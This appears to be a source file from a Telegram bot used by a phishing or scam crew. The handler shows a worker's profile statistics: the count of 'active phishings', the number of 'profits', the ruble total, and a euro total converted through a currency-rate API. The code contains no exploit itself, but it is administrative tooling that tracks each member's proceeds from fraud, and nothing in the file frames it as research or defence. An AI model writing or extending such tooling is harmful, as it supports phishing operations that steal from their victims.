const { Markup } = require("telegraf");

const { Profits, items } = require("../../../../database/index");

const axios = require("axios")

async function converter(amount, currency) {
    try {
      var balance = "";
      
      await axios
        .get("https://www.cbr-xml-daily.ru/daily_json.js")
        .then(async function (res) {
          balance = (amount / res.data.Valute.EUR.Value).toFixed(2);
        });
  
      return balance;
    } catch (err) {
      console.log(err);
      return "не удалить сонвертировать баланс";
    }
  }

module.exports = async (ctx) => {
  try {
    const itemCount = await items.count({
      where: {
        workerId: ctx.from.id
      }
    })

    const { count, rows } = await Profits.findAndCountAll({
      where: {
        workerId: ctx.from.id,
      },
    });

    var profitsSum = parseInt(
      await Profits.sum("rubAmount", {
        where: { workerId: ctx.from.id },
      })
    );

    if(isNaN(profitsSum)) profitsSum = 0

    return ctx
      .editMessageText(
        `🗂️ <b>Текущий раздел:</b>
╰ 📊 Профиль -> Статистика

╭ ▫️ <b>Username:</b> <code>${ctx.from.first_name}</code>
├ ▫️ <b>User ID:</b> <code>${ctx.from.id}</code>
╰ ▫️ <b>Tag:</b> <code>#${ctx.state.user.tag}</code>

├ <b>Активных фишингов:</b> ${itemCount}

╭ <b>Кол-во профитов:</b> ${count}
├ <b>Сумма профитов в рублях:</b> ${parseInt(profitsSum).toFixed(2)} ₽
╰ <b>Сумма профитов в евро:</b> ${await converter(profitsSum, "EUR")} €`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("🔥 ТОП-10", "top")],
            // [Markup.callbackButton("📊 График профитов", "chartProfit")],
            [Markup.callbackButton("< Назад", "menu")],
          ]),
        }
      )
      .catch((err) => err);
  } catch (err) {
    console.log(err);
  }
};